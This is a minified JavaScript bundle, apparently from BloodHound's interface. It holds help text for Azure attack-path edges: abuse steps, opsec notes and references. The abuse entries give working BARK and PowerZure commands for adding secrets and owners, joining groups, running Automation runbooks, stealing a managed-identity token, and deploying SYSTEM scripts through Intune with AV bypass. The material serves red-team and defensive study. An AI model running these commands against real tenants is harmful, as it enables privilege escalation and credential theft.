$SPToken.access_token eyJ0eXAiOiJKV1QiLCJub…'})]}),h(A,{variant:"body2",children:"Now you can use this JWT to perform actions against any other MS Graph endpoint as the service principal, continuing your attack path with the privileges of that service principal."})]}),opsec:()=>h(u,{children:h(A,{variant:"body2",children:"When you create a new secret for an App or Service Principal, Azure creates an event called “Update application – Certificates and secrets management”. This event describes who added the secret to which application or service principal."})}),references:()=>p(v,{sx:{overflowX:"auto"},children:[h(S,{target:"_blank",rel:"noopener",href:"https://attack.mitre.org/techniques/T1098/",children:"ATT&CK T1098: Account Manipulation"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://posts.specterops.io/azure-privilege-escalation-via-service-principal-abuse-210ae2be2a5",children:"Andy Robbins - Azure Privilege Escalation via Service Principal Abuse"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://docs.microsoft.com/en-us/azure/active-directory/roles/assign-roles-different-scopes",children:"Assign Azure AD roles at different scopes"})]})},Jt={general:()=>h(A,{variant:"body2",children:"Principals with the Application Admin role can control tenant-resident apps."}),abuse:()=>h(A,{variant:"body2",children:"Create a new credential for the app, then authenticate to the tenant as the app's service principal, then abuse whatever privilege it is that the service principal has."}),opsec:()=>h(A,{variant:"body2",children:"The Azure portal will create a log even whenever a new credential is created for a service principal."}),references:()=>h(v,{sx:{overflowX:"auto"},children:h(S,{target:"_blank",rel:"noopener",href:"https://dirkjanm.io/azure-ad-privilege-escalation-application-admin/",children:"https://dirkjanm.io/azure-ad-privilege-escalation-application-admin/"})})},Xt={general:()=>h(A,{variant:"body2",children:"The Azure Automation Contributor role grants full control of the target Azure Automation Account. This includes the ability to execute arbitrary commands on the Automation Account."}),abuse:()=>p(u,{children:[h(A,{variant:"body2",children:"You can use BARK's New-AzureAutomationAccountRunBook and Get-AzureAutomationAccountRunBookOutput functions to execute arbitrary commands against the target Automation Account."}),h(A,{variant:"body2",children:"These functions require you to supply an Azure Resource Manager scoped JWT associated with the principal that has the privilege to add or modify and run Automation Account run books. There are several ways to acquire a JWT. For example, you may use BARK's Get-ARMTokenWithRefreshToken to acquire an Azure RM-scoped JWT by supplying a refresh token:"}),h(A,{component:"pre",children:'$ARMToken = Get-ARMTokenWithRefreshToken ` \n    -RefreshToken "0.ARwA6WgJJ9X2qk…" ` \n    -TenantID "contoso.onmicrosoft.com"'}),h(A,{variant:"body2",children:"Now you can use BARK's New-AzureAutomationAccountRunBook function to add a new runbook to the target Automation Account, specifying a command to execute using the -Script parameter:"}),h(A,{component:"pre",children:'New-AzureAutomationAccountRunBook `\n    -Token $ARMToken `\n    -RunBookName "MyCoolRunBook" `\n    -AutomationAccountPath "https://management.azure.com/subscriptions/f1816681-4df5-4a31-acfa-922401687008/resourceGroups/AutomationAccts/providers/Microsoft.Automation/automationAccounts/MyCoolAutomationAccount" `\n    -Script "whoami"'}),h(A,{variant:"body2",children:"After adding the new runbook, you must execute it and fetch its output. You can do this automatically with BARK's Get-AzureAutomationAccountRunBookOutput function:"}),h(A,{component:"pre",children:'Get-AzureAutomationAccountRunBookOutput `\n    -Token $ARMToken `\n    -RunBookName "MyCoolRunBook" `\n    -AutomationAccountPath "https://management.azure.com/subscriptions/f1816681-4df5-4a31-acfa-922401687008/resourceGroups/AutomationAccts/providers/Microsoft.Automation/automationAccounts/MyCoolAutomationAccount"'}),h(A,{variant:"body2",children:"If the Automation Account has a managed identity assignment, you can use these two functions to retrieve a JWT for the service principal like this:"}),h(A,{component:"pre",children:'$Script = $tokenAuthURI = $env:MSI_ENDPOINT + "?resource=https://graph.microsoft.com/&api-version=2017-09-01"; $tokenResponse = Invoke-RestMethod -Method Get -Headers @{"Secret"="$env:MSI_SECRET"} -Uri $tokenAuthURI; $tokenResponse.access_token\nNew-AzureAutomationAccountRunBook -Token $ARMToken -RunBookName "MyCoolRunBook" -AutomationAccountPath "https://management.azure.com/subscriptions/f1816681-4df5-4a31-acfa-922401687008/resourceGroups/AutomationAccts/providers/Microsoft.Automation/automationAccounts/MyCoolAutomationAccount" -Script $Script\nGet-AzureAutomationAccountRunBookOutput -Token $ARMToken -RunBookName "MyCoolRunBook" -AutomationAccountPath "https://management.azure.com/subscriptions/f1816681-4df5-4a31-acfa-922401687008/resourceGroups/AutomationAccts/providers/Microsoft.Automation/automationAccounts/MyCoolAutomationAccount"'}),h(A,{variant:"body2",children:"If successful, the output will include a JWT for the managed identity service principal."})]}),opsec:()=>h(A,{variant:"body2",children:"This will depend on which particular abuse you perform, but in general Azure will create a log event for each abuse."}),references:()=>p(v,{sx:{overflowX:"auto"},children:[h(S,{target:"_blank",rel:"noopener",href:"https://github.com/BloodHoundAD/BARK",children:"Andy Robbins - BARK.ps1"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://posts.specterops.io/managed-identity-attack-paths-part-1-automation-accounts-82667d17187a",children:"Andy Robbins - Managed Identity Attack Paths, Part 1: Automation Accounts"})]})},Qt={general:()=>h(A,{variant:"body2",children:"Any principal granted the Avere Contributor role, scoped to the affected VM, can reset the built-in administrator password on the VM."}),abuse:()=>p(u,{children:[h(A,{variant:"body2",children:"The Avere Contributor role allows you to run SYSTEM commands on the VM"}),h(A,{variant:"body2",children:"Via PowerZure:"}),h(S,{target:"_blank",rel:"noopener",href:"http://Invoke-AzureRunCommand",children:"Invoke-AzureRunCommand"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"http://Invoke-AzureRunMSBuild",children:"Invoke-AzureRunMSBuild"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://powerzure.readthedocs.io/en/latest/Functions/operational.html#invoke-azurerunprogram",children:"Invoke-AzureRunProgram"})]}),opsec:()=>h(A,{variant:"body2",children:"Because you‘ll be running a command as the SYSTEM user on the Virtual Machine, the same opsec considerations for running malicious commands on any system should be taken into account: command line logging, PowerShell script block logging, EDR, etc."}),references:()=>p(v,{sx:{overflowX:"auto"},children:[h(S,{target:"_blank",rel:"noopener",href:"https://attack.mitre.org/tactics/TA0008/",children:"ATT&CK T0008: Lateral Movement"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://attack.mitre.org/techniques/T1021/",children:"ATT&CK T1021: Remote Services"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://docs.microsoft.com/en-us/azure/role-based-access-control/built-in-roles#avere-contributor",children:"Microsoft Docs - Avere Contributor"})]})},er={general:()=>h(A,{variant:"body2",children:"Principals with the Cloud App Admin role can control tenant-resident apps"}),abuse:()=>h(A,{variant:"body2",children:"Create a new credential for the app, then authenticate to the tenant as the app's service principal, then abuse whatever privilege it is that the service principal has."}),opsec:()=>h(A,{variant:"body2",children:"Auzre will create a log event whenever a new secret is created for a service principal."}),references:()=>h(A,{variant:"body2",children:h(S,{target:"_blank",rel:"noopener",href:"https://dirkjanm.io/azure-ad-privilege-escalation-application-admin/",children:"https://dirkjanm.io/azure-ad-privilege-escalation-application-admin/"})})},tr={general:()=>h(A,{variant:"body2",children:'This indicates that the parent object contains the child object, such as a resource group containing a virtual machine, or a tenant "containing" a subscription.'}),abuse:()=>h(A,{variant:"body2",children:"There is no abuse necessary, but any roles scoped on a parent object will descend down to all child objects."}),opsec:()=>h(A,{variant:"body2",children:"This depends on what you do, see other edges as far as opsec considerations for activating roles"}),references:()=>h(A,{variant:"body2",children:"No References Available"})},rr={general:()=>h(A,{variant:"body2",children:"The contributor role grants almost all abusable privileges in all circumstances, with some exceptions. Those exceptions are not collected by AzureHound."}),abuse:()=>p(u,{children:[h(A,{variant:"body2",children:"This depends on what the target object is:"}),p(A,{variant:"body2",children:[h(A,{fontWeight:"fontWeightBold",children:"Key Vault"}),": You can read secrets and alter access policies (grant yourself access to read secrets)"]}),p(A,{variant:"body2",children:[h(A,{fontWeight:"fontWeightBold",children:"Automation Account"}),": You can create a new runbook that runs as the Automation Account, and edit existing runbooks. Runbooks can be used to authenticate as the Automation Account and abuse privileges held by the Automation Account. If the Automation Account is using a 'RunAs' account, you can gather the certificate used to login and impersonate that account."]}),p(A,{variant:"body2",children:[h(A,{fontWeight:"fontWeightBold",children:"Virtual Machine"}),": Run SYSTEM commands on the VM"]}),p(A,{variant:"body2",children:[h(A,{fontWeight:"fontWeightBold",children:"Resource Group"}),": NOT abusable, and not collected by AzureHound"]}),h(A,{variant:"body2",children:"Via PowerZure:"}),h(S,{target:"_blank",rel:"noopener",href:"https://powerzure.readthedocs.io/en/latest/Functions/operational.html#get-azurekeyvaultcontent",children:"Get-AzureKeyVaultContent"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://powerzure.readthedocs.io/en/latest/Functions/operational.html#export-azurekeyvaultcontent",children:"Export-AzureKeyVaultContent"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://powerzure.readthedocs.io/en/latest/Functions/operational.html#get-azurerunascertificate",children:"Get-AzureRunAsCertificate"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://powerzure.readthedocs.io/en/latest/Functions/operational.html#get-azurerunbookcontent",children:"Get-AzureRunbookContent"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"http://Invoke-AzureRunCommand",children:"Invoke-AzureRunCommand"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"http://Invoke-AzureRunMSBuild",children:"Invoke-AzureRunMSBuild"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://powerzure.readthedocs.io/en/latest/Functions/operational.html#invoke-azurerunprogram",children:"Invoke-AzureRunProgram"})]}),opsec:()=>h(A,{variant:"body2",children:"This will depend on which particular abuse you perform, but in general Azure will create a log event for each abuse."}),references:()=>p(v,{sx:{overflowX:"auto"},children:[p(S,{target:"_blank",rel:"noopener",href:"https://blog.netspi.com/maintaining-azure-persistence-via-automation-accounts/ ",children:["https://blog.netspi.com/maintaining-azure-persistence-via-automation-accounts/"," "]}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://blog.netspi.com/azure-automation-accounts-key-stores/",children:"https://blog.netspi.com/azure-automation-accounts-key-stores/"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://blog.netspi.com/get-azurepasswords/",children:"https://blog.netspi.com/get-azurepasswords/"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://blog.netspi.com/attacking-azure-cloud-shell/",children:"https://blog.netspi.com/attacking-azure-cloud-shell/"})]})},nr={general:()=>h(A,{variant:"body2",children:"Principals with the Intune Administrators role are able to execute arbitrary PowerShell scripts on devices that are joined to the Azure Active Directory tenant."}),abuse:()=>p(u,{children:[h(A,{variant:"body2",children:"First, have your PowerShell script ready to go and save it somewhere as a PS1 file. Take all the necessary operational security (opsec) and AMSI-bypass steps you want at this point, keeping in mind the script will run as the SYSTEM user unless you specify otherwise. Also keep in mind that the script will be written to disk, so take whatever AV bypass measures you need as well."}),h(A,{variant:"body2",children:"Next, log into the Azure web portal as the user with the “Intune Administrator” role activated. After authenticating, access Endpoint Manager at https://endpoint.microsoft.com"}),h(A,{variant:"body2",children:"Click on “Devices” on the left, which takes you, unsurprisingly, to the devices overview. Click on “Scripts” under the “Policy” section to go to the scripts management page. Click “Add,” then click “Windows 10”"}),h(A,{variant:"body2",children:"This will bring you to the “Add Powershell Script” page. On this first page, you’ll enter a name for the script and a brief description. On the next page, click the folder and then select your PS1 from the common dialogue window. You’ve now got three options to configure, but can leave them all in the default “No” position. Most interestingly, keeping the first selection as “No” will cause the script to run as the SYSTEM user"}),h(A,{variant:"body2",children:"Click next, and you’ll see the page that lets you scope which systems and users this script will execute for. You can choose to assign the script to “All devices,” “All users,” or “All users and devices.” If you leave the “Assign to” dropdown at its default selection of “Selected groups,” you can scope the script to only execute on systems or for users that belong to certain security groups. The choice is yours: run the script on every possible system or constrain it to only run on certain systems by scoping it to existing security groups or by adding specific devices or users to new security groups."}),h(A,{variant:"body2",children:"Click “Next” and you’ll see the review page which lets you see what you’re about to do. Click “Add” and Azure will begin registering the script."}),h(A,{variant:"body2",children:"At this point, the script is now ready to run on your target systems. This process works similarly to Group Policy, in that the Intune agent running on each device periodically checks in (by default every hour) with Intune/Endpoint Manager to see if there is a PowerShell script for it to run, so you will need to wait up to an hour for your target system to actually pull the script down and run it."})]}),opsec:()=>p(u,{children:[h(A,{variant:"body2",children:"When the Intune agent pulls down and executes PowerShell scripts, a number of artifacts are created on the endpoint — some permanent and some ephemeral."}),h(A,{variant:"body2",children:"Two files are created on the endpoint when a PowerShell script is executed in the following locations: - C:\\Program files (x86)\\Microsoft Intune Management Extension\\Policies\\Scripts - C:\\Program files (x86)\\Microsoft Intune Management Extension\\Policies\\Results"}),h(A,{variant:"body2",children:"The file under the “Scripts” folder will be a local copy of the PS1 stored in Azure, and the file under the “Results” folder will be the output of the PS1; however, both of these files are automatically deleted as soon as the script finishes running."}),h(A,{variant:"body2",children:"There are also permanent artifacts left over (assuming the attacker doesn’t tamper with them). A full copy of the contents of the PS1 can be found in this log file: - C:\\ProgramData\\Microsoft\\IntuneManagementExtension\\Logs\\_IntuneManagementExtension.txt"})]}),references:()=>p(v,{sx:{overflowX:"auto"},children:[h(S,{target:"_blank",rel:"noopener",href:"https://attack.mitre.org/tactics/TA0002/",children:"MITRE: Execution"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://posts.specterops.io/death-from-above-lateral-movement-from-azure-to-on-prem-ad-d18cb3959d4d",children:"Death from Above: Lateral Movement from Azure to On-Prem AD"})]})},or={general:()=>h(A,{variant:"body2",children:"The ability to read certificates from key vaults"}),abuse:()=>p(u,{children:[h(A,{variant:"body2",children:"Use PowerShell or PowerZure to fetch the certificate from the key vault"}),h(A,{variant:"body2",children:"Via PowerZure"}),h(S,{target:"_blank",rel:"noopener",href:"https://powerzure.readthedocs.io/en/latest/Functions/operational.html#get-azurekeyvaultcontent",children:"Get-AzureKeyVaultContent"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://powerzure.readthedocs.io/en/latest/Functions/operational.html#export-azurekeyvaultcontent",children:"Export-AzureKeyVaultcontent"})]}),opsec:()=>h(A,{variant:"body2",children:"Azure will create a new log event for the key vault whenever a secret is accessed."}),references:()=>p(v,{sx:{overflowX:"auto"},children:[h(S,{target:"_blank",rel:"noopener",href:"https://blog.netspi.com/azure-automation-accounts-key-stores/",children:"https://blog.netspi.com/azure-automation-accounts-key-stores/"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://powerzure.readthedocs.io/en/latest/Functions/operational.html#get-azurekeyvaultcontent",children:"https://powerzure.readthedocs.io/en/latest/Functions/operational.html#get-azurekeyvaultcontent"})]})},ar={general:()=>h(A,{variant:"body2",children:"The ability to read keys from key vaults"}),abuse:()=>p(u,{children:[h(A,{variant:"body2",children:"Use PowerShell or PowerZure to fetch the key from the key vault"}),h(A,{variant:"body2",children:"Via PowerZure"}),h(S,{target:"_blank",rel:"noopener",href:"https://powerzure.readthedocs.io/en/latest/Functions/operational.html#export-azurekeyvaultcontent",children:"Export-AzureKeyVaultContent"})]}),opsec:()=>h(A,{variant:"body2",children:"Azure will create a new log event for the key vault whenever a secret is accessed."}),references:()=>p(v,{sx:{overflowX:"auto"},children:[h(S,{target:"_blank",rel:"noopener",href:"https://blog.netspi.com/azure-automation-accounts-key-stores/",children:"https://blog.netspi.com/azure-automation-accounts-key-stores/"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://powerzure.readthedocs.io/en/latest/Functions/operational.html#export-azurekeyvaultcontent",children:"https://powerzure.readthedocs.io/en/latest/Functions/operational.html#export-azurekeyvaultcontent"})]})},ir={general:()=>h(A,{variant:"body2",children:"The ability to read secrets from key vaults"}),abuse:()=>p(u,{children:[h(A,{variant:"body2",children:"Use PowerShell or PowerZure to fetch the secret from the key vault"}),h(A,{variant:"body2",children:"Via PowerZure"}),h(S,{target:"_blank",rel:"noopener",href:"https://powerzure.readthedocs.io/en/latest/Functions/operational.html#get-azurekeyvaultcontent",children:"Get-AzureKeyVaultContent"})]}),opsec:()=>h(A,{variant:"body2",children:"Azure will create a new log event for the key vault whenever a secret is accessed."}),references:()=>p(v,{sx:{overflowX:"auto"},children:[h(S,{target:"_blank",rel:"noopener",href:"https://blog.netspi.com/azure-automation-accounts-key-stores/",children:"https://blog.netspi.com/azure-automation-accounts-key-stores/"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://powerzure.readthedocs.io/en/latest/Functions/operational.html#get-azurekeyvaultcontent",children:"https://powerzure.readthedocs.io/en/latest/Functions/operational.html#get-azurekeyvaultcontent"})]})},sr={general:()=>h(A,{variant:"body2",children:"This edge indicates the principal has the Global Admin role active against the target tenant. In other words, the principal is a Global Admin. Global Admins can do almost anything against almost every object type in the tenant, this is the highest privilege role in Azure."}),abuse:()=>p(u,{children:[h(A,{variant:"body2",children:"As a Global Admin, you can change passwords, run commands on VMs, read key vault secrets, activate roles for other users, etc."}),h(A,{variant:"body2",children:"Via PowerZure"}),h(S,{target:"_blank",rel:"noopener",href:"https://powerzure.readthedocs.io/en/latest/Functions/operational.html",children:"https://powerzure.readthedocs.io/en/latest/Functions/operational.html"}),h(A,{variant:"body2",children:"For Global Admin to be able to abuse Azure resources, you must first grant yourself the 'User Access Administrator' role in Azure RBAC. This is done through a toggle button in the portal, or via the PowerZure function Set-AzureElevatedPrivileges."}),h(A,{variant:"body2",children:"Once that role is applied to account, you can then add yourself as an Owner to all subscriptions in the tenant"})]}),opsec:()=>h(A,{variant:"body2",children:"This depends on exactly what you do, but in general Azure will log each abuse action."}),references:()=>h(v,{sx:{overflowX:"auto"},children:h(S,{target:"_blank",rel:"noopener",href:"https://blog.netspi.com/attacking-azure-cloud-shell/",children:"https://blog.netspi.com/attacking-azure-cloud-shell/"})})},cr={general:()=>h(A,{variant:"body2",children:"This edge indicates that a principal has been granted a particular AzureAD admin role."}),abuse:()=>h(u,{children:h(A,{variant:"body2",children:"No abuse is necessary. This edge only indicates that the principal has been granted a particular AzureAD admin role."})}),opsec:()=>h(A,{variant:"body2",children:"The opsec considerations for a particular action authorized by a principal“s active AzureAD role assignment will wholly depend on what the action taken is. This edge does not capture all abusable possibilities."}),references:()=>p(v,{sx:{overflowX:"auto"},children:[h(S,{target:"_blank",rel:"noopener",href:"https://docs.microsoft.com/en-us/graph/permissions-reference",children:"Microsoft Graph Permission Reference"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://docs.microsoft.com/en-us/azure/role-based-access-control/overview",children:"Azure role-based access control"})]})},dr={general:()=>h(A,{variant:"body2",children:"The Key Vault Contributor role grants full control of the target Key Vault. This includes the ability to read all secrets stored on the Key Vault."}),abuse:()=>p(u,{children:[h(A,{variant:"body2",children:"You can read secrets and alter access policies (grant yourself access to read secrets)"}),h(A,{variant:"body2",children:"Via PowerZure:"}),h(S,{target:"_blank",rel:"noopener",href:"https://powerzure.readthedocs.io/en/latest/Functions/operational.html#get-azurekeyvaultcontent",children:"Get-AzureKeyVaultContent"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://powerzure.readthedocs.io/en/latest/Functions/operational.html#export-azurekeyvaultcontent",children:"Export-AzureKeyVaultContent"})]}),opsec:()=>h(A,{variant:"body2",children:"This will depend on which particular abuse you perform, but in general Azure will create a log event for each abuse."}),references:()=>p(v,{sx:{overflowX:"auto"},children:[p(S,{target:"_blank",rel:"noopener",href:"https://blog.netspi.com/maintaining-azure-persistence-via-automation-accounts/ ",children:["https://blog.netspi.com/maintaining-azure-persistence-via-automation-accounts/"," "]}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://blog.netspi.com/azure-automation-accounts-key-stores/",children:"https://blog.netspi.com/azure-automation-accounts-key-stores/"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://blog.netspi.com/get-azurepasswords/",children:"https://blog.netspi.com/get-azurepasswords/"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://blog.netspi.com/attacking-azure-cloud-shell/",children:"https://blog.netspi.com/attacking-azure-cloud-shell/"})]})},lr={general:()=>h(A,{variant:"body2",children:"The Logic Contributor role grants full control of the target Logic App. This includes the ability to execute arbitrary commands on the Logic App."}),abuse:()=>p(u,{children:[h(A,{variant:"body2",children:"Currently you need access to the portal GUI to execute this abuse."}),h(A,{variant:"body2",children:"The abuse involves adding or modifying an existing logic app to coerce the logic app into sending a JWT for its managed identity service principal to a web server you control."}),h(A,{variant:"body2",children:"You can see a full walkthrough for executing that abuse in this blog post:"}),h(A,{variant:"body2",children:h(S,{target:"_blank",rel:"noopener",href:"https://medium.com/p/52b29354fc54",children:"Andy Robbins - Managed Identity Attack Paths, Part 2: Logic Apps"})})]}),opsec:()=>h(A,{variant:"body2",children:"This will depend on which particular abuse you perform, but in general Azure will create a log event for each abuse."}),references:()=>p(v,{sx:{overflowX:"auto"},children:[h(S,{target:"_blank",rel:"noopener",href:"https://github.com/BloodHoundAD/BARK",children:"Andy Robbins - BARK.ps1"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://medium.com/p/52b29354fc54",children:"Managed Identity Attack Paths, Part 2: Logic Apps"})]})},hr={general:()=>p(u,{children:[h(A,{variant:"body2",children:"This edge is created during post-processing. It is created against non role assignable Azure AD security groups when a Service Principal has one of the following MS Graph app role assignments:"}),p(Z,{children:[h(q,{children:h(Y,{children:"Directory.ReadWrite.All"})}),h(q,{children:h(Y,{children:"Group.ReadWrite.All"})}),h(q,{children:h(Y,{children:"GroupMember.ReadWrite.All"})})]}),h(A,{variant:"body2",children:"It is created against all Azure AD security groups, including those that are role assignable, when a Service Principal has the following MS Graph app role:"}),h(Z,{children:h(q,{children:h(Y,{children:"RoleManagement.ReadWrite.Directory"})})}),h(A,{variant:"body2",children:"You will not see this privilege when using just the Azure portal or any other Microsoft tooling. If you audit the roles and administrators affecting any particular Azure security group, you will not see that the Service Principal can add members to the group, but it indeed can because of the parallel access management system used by MS Graph."})]}),abuse:()=>p(u,{children:[h(A,{variant:"body2",children:"You can abuse this privilege using BARK's Add-AZMemberToGroup function."}),h(A,{variant:"body2",children:"This function requires you to supply an MS Graph-scoped JWT associated with the Service Principal that has the privilege to add principal to the target group. There are several ways to acquire a JWT. For example, you may use BARK’s Get-MSGraphTokenWithClientCredentials to acquire an MS Graph-scoped JWT by supplying a Service Principal Client ID and secret:"}),h(A,{component:"pre",children:'$MGToken = Get-MSGraphTokenWithClientCredentials `\n    -ClientID "34c7f844-b6d7-47f3-b1b8-720e0ecba49c" `\n    -ClientSecret "asdf..." `\n    -TenantName "contoso.onmicrosoft.com"'}),h(A,{variant:"body2",children:"Then use BARK’s Add-AZMemberToGroup function to add a new principial to the target group:"}),h(A,{component:"pre",children:'Add-AZMemberToGroup `\n    -PrincipalID = "028362ca-90ae-41f2-ae9f-1a678cc17391" `\n    -TargetGroupId "b9801b7a-fcec-44e2-a21b-86cb7ec718e4" `\n    -Token $MGToken.access_token'}),h(A,{variant:"body2",children:"Now you can re-authenticate as the principial you just added to the group and continue your attack path, now having whatever privileges the target group has."})]}),opsec:()=>h(u,{children:h(A,{variant:"body2",children:"The Azure activity log for the tenant will log who added what principal to what group, including the date and time."})}),references:()=>p(v,{sx:{overflowX:"auto"},children:[h(S,{target:"_blank",rel:"noopener",href:"https://attack.mitre.org/techniques/T1098/",children:"ATT&CK T1098: Account Manipulation"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://posts.specterops.io/azure-privilege-escalation-via-service-principal-abuse-210ae2be2a5",children:"Andy Robbins - Azure Privilege Escalation via Service Principal Abuse"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://github.com/BloodHoundAD/BARK",children:"Andy Robbins - BARK.ps1"})]})},pr={general:()=>p(u,{children:[h(A,{variant:"body2",children:"This edge is created during post-processing. It is created against all App Registrations and Service Principals within the same tenant when a Service Principal has the following MS Graph app role:"}),h(A,{variant:"body2",children:h(Z,{children:h(q,{children:h(Y,{children:"Application.ReadWrite.All"})})})}),h(A,{variant:"body2",children:"It is also created against all Azure Service Principals when a Service Principal has the following MS Graph app role:"}),h(A,{variant:"body2",children:h(Z,{children:h(q,{children:h(Y,{children:"ServicePrincipalEndpoint.ReadWrite.All"})})})}),h(A,{variant:"body2",children:"It is also created against all Azure security groups that are not role eligible when a Service Principal has one of the following MS Graph app roles:"}),h(A,{variant:"body2",children:p(Z,{children:[h(q,{children:h(Y,{children:"Directory.ReadWrite.All"})}),h(q,{children:h(Y,{children:"Group.ReadWrite.All"})})]})}),h(A,{variant:"body2",children:"Finally, it is created against all Azure security groups and all Azure App Registrations when a Service Principal has the following MS Graph app role:"}),h(A,{variant:"body2",children:h(Z,{children:h(q,{children:h(Y,{children:"RoleManagement.ReadWrite.Directory"})})})}),h(A,{variant:"body2",children:"You will not see these privileges when auditing permissions against any of the mentioned objects when you use Microsoft tooling, including the Azure portal and the MS Graph API itself."})]}),abuse:()=>p(u,{children:[h(A,{variant:"body2",children:"You can use BARK to add a new owner to the target object. The BARK function you use will depend on the target object type, but all of the functions follow a similar syntax."}),h(A,{variant:"body2",children:"These functions require you to supply an MS Graph-scoped JWT associated with the Service Principal that has the privilege to add a new owner to the target object. There are several ways to acquire a JWT. For example, you may use BARK’s Get-MSGraphTokenWithClientCredentials to acquire an MS Graph-scoped JWT by supplying a Service Principal Client ID and secret:"}),h(A,{component:"pre",children:'$MGToken = Get-MSGraphTokenWithClientCredentials `\n    -ClientID "34c7f844-b6d7-47f3-b1b8-720e0ecba49c" `\n    -ClientSecret "asdf..." `\n    -TenantName "contoso.onmicrosoft.com"'}),h(A,{variant:"body2",children:"To add a new owner to a Service Principal, use BARK's New-ServicePrincipalOwner function:"}),h(A,{component:"pre",children:'New-ServicePrincipalOwner `\n    -ServicePrincipalObjectId "082cf9b3-24e2-427b-bcde-88ffdccb5fad" `\n    -NewOwnerObjectId "cea271c4-7b01-4f57-932d-99d752bbbc60" `\n    -Token $Token'}),h(A,{variant:"body2",children:"To add a new owner to an App Registration, use BARK's New-AppOwner function:"}),h(A,{component:"pre",children:'New-AppOwner `\n    -AppObjectId "52114a0d-fa5b-4ee5-9a29-2ba048d46eee" `\n    -NewOwnerObjectId "cea271c4-7b01-4f57-932d-99d752bbbc60" `\n    -Token $Token'}),h(A,{variant:"body2",children:"To add a new owner to a Group, use BARK's New-GroupOwner function:"}),h(A,{component:"pre",children:'New-AppOwner `\n    -GroupObjectId "352032bf-161d-4788-b77c-b6f935339770" `\n    -NewOwnerObjectId "cea271c4-7b01-4f57-932d-99d752bbbc60" `\n    -Token $Token'})]}),opsec:()=>h(u,{children:h(A,{variant:"body2",children:"Any time you add an owner to any Azure object, the AzureAD audit logs will create an event logging who added an owner to what object, as well as what the new owner added to the object was."})}),references:()=>p(v,{sx:{overflowX:"auto"},children:[h(S,{target:"_blank",rel:"noopener",href:"https://attack.mitre.org/techniques/T1098/",children:"ATT&CK T1098: Account Manipulation"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://posts.specterops.io/azure-privilege-escalation-via-service-principal-abuse-210ae2be2a5",children:"Andy Robbins - Azure Privilege Escalation via Service Principal Abuse"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://github.com/BloodHoundAD/BARK",children:"Andy Robbins - BARK.ps1"})]})},ur={general:()=>p(u,{children:[h(A,{variant:"body2",children:"This edge is created during post-processing. It is created against all Azure App Registrations and Service Principals when a Service Principal has one of the following MS Graph app roles:"}),h(A,{variant:"body2",children:p(Z,{children:[h(q,{children:h(Y,{children:"Application.ReadWrite.All"})}),h(q,{children:h(Y,{children:"RoleManagement.ReadWrite.Directory"})})]})}),h(A,{variant:"body2",children:"You will not see this privilege when using just the Azure portal or any other Microsoft tooling. If you audit the roles and administrators affecting any particular Azure App or Service Principal, you will not see that the Service Principal can add secrets to the object, but it indeed can because of the parallel access management system used by MS Graph."})]}),abuse:()=>p(u,{children:[h(A,{variant:"body2",children:"There are several ways to perform this abuse, depending on what sort of access you have to the credentials of the object that holds this privilege against the target object. If you have an interactive web browser session for the Azure portal, it is as simple as finding the target App in the portal and adding a new secret to the object using the “Certificates & secrets” tab. Service Principals do not have this tab in the Azure portal but you can add secrets to them with the MS Graph API."}),h(A,{variant:"body2",children:"No matter what kind of control you have, you will be able to perform this abuse by using BARK’s New-AppRegSecret or New-ServicePrincipalSecret functions."}),h(A,{variant:"body2",children:"These functions require you to supply an MS Graph-scoped JWT associated with the Service Principal that has the privilege to add secrets to the target object. There are several ways to acquire a JWT. For example, you may use BARK’s Get-MSGraphTokenWithClientCredentials to acquire an MS Graph-scoped JWT by supplying a Service Principal Client ID and secret:"}),h(A,{component:"pre",children:'$MGToken = Get-MSGraphTokenWithClientCredentials\n    -ClientID "34c7f844-b6d7-47f3-b1b8-720e0ecba49c"\n    -ClientSecret "asdf..."\n    -TenantName "contoso.onmicrosoft.com"'}),h(A,{variant:"body2",children:"Then use BARK’s New-AppRegSecret to add a new secret to the target application:"}),h(A,{component:"pre",children:'New-AppRegSecret `\n    -AppRegObjectID "d878…" `\n    -Token $MGToken.access_token'}),h(A,{variant:"body2",children:"The output will contain the plain-text secret you just created for the target app:"}),h(A,{component:"pre",children:'New-AppRegSecret `\n-AppRegObjectID "d878…" `\n-Token $MGToken.access_token\n\nName                Value\n-----------------------------\nAppRegSecretValue   odg8Q~...\nAppRegAppId         4d31…\nAppRegObjectId      d878…'}),h(A,{variant:"body2",children:"With this plain text secret, you can now acquire tokens as the service principal associated with the app. You can easily do this with BARK’s Get-MSGraphToken function:"}),h(A,{component:"pre",children:'$SPToken = Get-MSGraphToken `\n    -ClientID "4d31…" `\n    -ClientSecret "odg8Q~..." `\n    -TenantName "contoso.onmicrosoft.com"'}),h(A,{variant:"body2",children:"Now you can use this JWT to perform actions against any other 